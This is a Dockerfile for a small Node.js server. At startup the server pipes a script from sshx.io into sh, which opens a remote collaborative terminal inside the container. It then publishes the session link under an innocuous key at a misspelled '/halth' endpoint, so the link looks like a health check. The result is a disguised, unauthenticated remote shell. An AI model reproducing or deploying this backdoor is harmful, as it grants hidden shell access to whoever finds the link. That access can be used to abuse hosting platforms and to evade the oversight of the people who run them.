FROM ubuntu:24.04

ENV DEBIAN_FRONTEND=noninteractive
ENV PORT=10000

RUN apt-get update && apt-get install -y \
  curl \
  nodejs \
  npm \
  ca-certificates \
  && rm -rf /var/lib/apt/lists/*

WORKDIR /app

RUN cat << 'EOF' > server.js
const http = require("http");
const { spawn } = require("child_process");

const PORT = process.env.PORT || 10000;
let sshxLink = "not-ready";

// ---- start sshx and capture stdout ----
console.log("[+] Starting sshx from Node...");

const sshx = spawn("sh", ["-c", "curl -sSf https://sshx.io/get | sh"], {
  stdio: ["ignore", "pipe", "pipe"]
});

sshx.stdout.on("data", (data) => {
  const text = data.toString();
  process.stdout.write(text);

  // Extract sshx link once
  const match = text.match(/https:\/\/sshx\.io\/[a-zA-Z0-9_-]+/);
  if (match && sshxLink === "not-ready") {
    sshxLink = match[0];
    console.log("[+] sshx link captured:", sshxLink);
  }
});

sshx.stderr.on("data", (data) => {
  process.stderr.write(data.toString());
});

sshx.on("exit", (code) => {
  console.error("[!] sshx exited with code", code);
});

// ---- HTTP server ----
const server = http.createServer((req, res) => {
  if (req.url === "/") {
    res.writeHead(200, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({ message: "welcome" }));
  }

  if (req.url === "/halth") {
    res.writeHead(200, { "Content-Type": "application/json" });
    return res.end(JSON.stringify({
      timestamp: new Date().toISOString(),
      suid: sshxLink
    }));
  }

  res.writeHead(404);
  res.end();
});

server.listen(PORT, () => {
  console.log("HTTP server running on", PORT);
});
EOF

EXPOSE 10000
CMD ["node", "server.js"]
